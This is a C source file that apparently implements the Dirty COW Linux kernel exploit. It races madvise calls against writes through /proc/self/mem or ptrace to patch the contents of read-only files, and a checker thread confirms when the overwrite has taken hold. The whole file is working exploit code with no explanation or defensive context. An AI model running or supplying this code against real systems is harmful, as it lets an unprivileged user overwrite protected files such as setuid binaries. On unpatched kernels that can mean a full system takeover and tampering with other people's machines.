#include <err.h>
#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/ptrace.h>

#include "dcow.h"

#define LOOP   0x100000
#define TIMEOUT 10

pid_t pid;

static void *checkThread(void *arg) {
	struct mem_arg *mem_arg;
	mem_arg = (struct mem_arg *)arg;
	struct stat st;
	int i;
	char * newdata = malloc(mem_arg->patch_size);
	for(i = 0; i < TIMEOUT && !mem_arg->stop; i++) {
		int f=open(mem_arg->fname, O_RDONLY);
		if (f == -1) {
			LOGV("could not open %s", mem_arg->fname);
			break;
		}
		if (fstat(f,&st) == -1) {
			LOGV("could not stat %s", mem_arg->fname);
			close(f);
			break;
		}
		lseek(f, mem_arg->patch_offset, SEEK_SET);
		read(f, newdata, mem_arg->patch_size);
		close(f);

		int memcmpret = memcmp(newdata, mem_arg->patch, mem_arg->patch_size);
		if (memcmpret == 0) {
			mem_arg->stop = 1;
			mem_arg->success = 1;
			return 0;
		}
		usleep(100 * 1000);
	}
	mem_arg->stop = 1;
	return 0;
}

static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);

	LOGV("[*] madvise = %p %zd", addr, size);

	for(i = 0; i < LOOP && !mem_arg->stop; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
	}

	LOGV("[*] madvise = %d %d", c, i);
	mem_arg->stop = 1;
	return 0;
}

static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
{
	const unsigned char *s;
	unsigned long value;
	unsigned char *d;

	d = dest;
	s = src;

	while (n >= sizeof(long)) {
		memcpy(&value, s, sizeof(value));
		if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
			warn("ptrace(PTRACE_POKETEXT)");
			return -1;
		}

		n -= sizeof(long);
		d += sizeof(long);
		s += sizeof(long);
	}

	if (n > 0) {
		d -= sizeof(long) - n;

		errno = 0;
		value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
		if (value == -1 && errno != 0) {
			warn("ptrace(PTRACE_PEEKTEXT)");
			return -1;
		}

		memcpy((unsigned char *)&value + sizeof(value) - n, s, n);
		if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
			warn("ptrace(PTRACE_POKETEXT)");
			return -1;
		}
	}

	return 0;
}

static void *ptraceThread(void *arg)
{
	struct mem_arg *mem_arg;
	mem_arg = (struct mem_arg *)arg;
	void * offset = mem_arg->offset + mem_arg->patch_offset;

	int i, c;
	for (i = 0; i < LOOP && !mem_arg->stop; i++) {
		c = ptrace_memcpy(pid, offset, mem_arg->patch, mem_arg->patch_size);
	}

	LOGV("[*] ptrace %d %i", c, i);

	mem_arg->stop = 1;
	return NULL;
}

int canwritetoselfmem(void *arg) {
	struct mem_arg *mem_arg;
	mem_arg = (struct mem_arg *)arg;
	off_t offset = (off_t)mem_arg->offset + mem_arg->patch_offset;
	int fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1) {
		LOGV("open(\"/proc/self/mem\"");
	}
	int returnval = -1;
	lseek(fd, offset, SEEK_SET);
	if (write(fd, mem_arg->patch, mem_arg->patch_size) == mem_arg->patch_size) {
		returnval = 0;
	}

	close(fd);
	return returnval;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	mem_arg = (struct mem_arg *)arg;
	off_t offset = (off_t)mem_arg->offset + mem_arg->patch_offset;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1) {
		LOGV("open(\"/proc/self/mem\"");
	}

	for (i = 0; i < LOOP && !mem_arg->stop; i++) {
		lseek(fd, offset, SEEK_SET);
		c += write(fd, mem_arg->patch, mem_arg->patch_size);
	}

	LOGV("[*] /proc/self/mem %d %i", c, i);

	close(fd);

	mem_arg->stop = 1;
	return NULL;
}

void exploit(struct mem_arg *mem_arg)
{
	pthread_t pth1, pth2, pth3;

	LOGV("[*] dirtycow patching %s %lx %lx", mem_arg->fname, mem_arg->patch_offset, mem_arg->patch_size);
	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	mem_arg->stop = 0;
	mem_arg->success = 0;

	if (canwritetoselfmem(mem_arg) == -1) {
		LOGV("[*] using ptrace method");
		pid=fork();
		if(pid) {
			pthread_create(&pth3, NULL, checkThread, mem_arg);
			waitpid(pid,NULL,0);
			ptraceThread((void*)mem_arg);
			pthread_join(pth3, NULL);
		} else {
			pthread_create(&pth1, NULL, madviseThread, mem_arg);
			ptrace(PTRACE_TRACEME);
			kill(getpid(),SIGSTOP);
			pthread_join(pth1, NULL);
		}
	} else {
		LOGV("[*] using /proc/self/mem method");
		pthread_create(&pth3, NULL, checkThread, mem_arg);
		pthread_create(&pth1, NULL, madviseThread, mem_arg);
		pthread_create(&pth2, NULL, procselfmemThread, mem_arg);
		pthread_join(pth3, NULL);
		pthread_join(pth1, NULL);
		pthread_join(pth2, NULL);
	}

	LOGV("[*] exploited %d %p=%lx", pid, (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}
